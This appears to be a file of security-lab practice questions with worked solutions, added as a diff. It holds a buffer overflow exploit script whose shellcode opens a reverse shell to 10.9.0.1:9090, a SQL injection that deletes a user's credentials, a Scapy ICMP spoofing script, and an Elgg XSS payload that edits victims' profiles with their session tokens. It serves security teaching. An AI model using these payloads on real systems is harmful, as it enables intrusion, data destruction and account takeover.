@@ -1,0 +1,115 @@
+BOF Attack Practical Question Example 1
+
+The vulnerable program involved In Task 2 of the Buffer Overflow Attack Lab has been modified so that the ebp and buffer addresses are not printed anymore. In addition, any kind of randomization has been removed so that the ebp and buffer addresses are always the same over different executions. 
+
+You are required to achieve the original goal of the task by finding an alternative way for retrieving the ebp and buffer addresses. 
+
+Get the base pointer with gdb right before the strcpy in bof() is performed, can be done with "x/x $ebp". 
+Then exploit_L1-alt.py will work just fine.
+
+#!/usr/bin/python3
+import sys
+
+if len(sys.argv) != 2:
+    print(f"Usage: {sys.argv[0]} frame_pointer_address")
+    exit(1)
+
+shellcode = (
+   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
+   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
+   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
+   "/bin/bash*"
+   "-c*"
+   # You can modify the following command string to run any command.
+   # You can even run multiple commands. When you change the string,
+   # make sure that the position of the * at the end doesn't change.
+   # The code above will change the byte at this position to zero,
+   # so the command string ends here.
+   # You can delete/add spaces, if needed, to keep the position the same. 
+   # The * in this line serves as the position marker         * 
+   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
+   # to work you must be listening on the 9090 port "nc -nlvp 9090"
+   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
+   "BBBB"   # Placeholder for argv[1] --> "-c"
+   "CCCC"   # Placeholder for argv[2] --> the command string
+   "DDDD"   # Placeholder for argv[3] --> NULL
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517)) 
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 517-len(shellcode)              # Change this number
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value 
+# and put it somewhere in the payload
+# frame pointer
+ret    = int(sys.argv[1], 16)+8     # Change this number 
+offset = 116              # Change this number 
+
+# Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+
+-----------------------------------------------------------------------------
+SQL Injection Attack Practical Question Example 1
+
+The countermeasure that prevents the execution of multiple queries on the server has been disabled. 
+
+Complete the Task 2.3 of the SQL injection attack so that with a single SQL statement you perform a SELECT statement (the default one embedded in the query) and a DELETE statement that removes the credentials for the Samy account. 
+
+Admin'; DELETE FROM credential WHERE name='Samy';#
+-----------------------------------------------------------------------------
+ICMP Spoofing
+
+In this exercise, you are required to create and send a spoofed ICMP packet to a victim host, such that the reply will be received by a second victim host.
+
+Please, complete the code with the correct IP addresses, knowing that you want the echo reply to be received by host 10.9.0.8
+
+#!/usr/bin/env python3
+from scapy.all import *
+ip = IP()
+ip.dst = "10.9.0.5"
+ip.src = "10.9.0.8"
+icmp = ip/ICMP()
+received = send(icmp)
+print(received is None)
+-----------------------------------------------------------------------------
+XSS Cookie Display
+
+In this task, you are requested to post the malicious message "hacked!" to Alice's social page on the elgg website.
+
+Please insert the script HTML tag in the correct location to display the alert message.
+
+Modify Samy's profile description to this
+<script type="text/javascript">
+window.onload = function() {
+//JavaScript code to access user name, user guid, Time Stamp
+__elgg_ts
+//and Security Token __elgg_token
+var userName="&name="+elgg.session.user.name;
+var guid="&guid="+elgg.session.user.guid;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+//Construct the content of your url.
+var samyGuid="59"
+var description="&description=hacked!";
+var content=token+ts+userName+description+guid;
+var sendurl="/action/profile/edit";
+if(elgg.session.user.guid != samyGuid) {
+var Ajax=null;
+Ajax=new XMLHttpRequest();
+Ajax.open("POST", sendurl, true);
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+Ajax.send(content);
+}
+}
+</script>
+-----------------------------------------------------------------------------
+
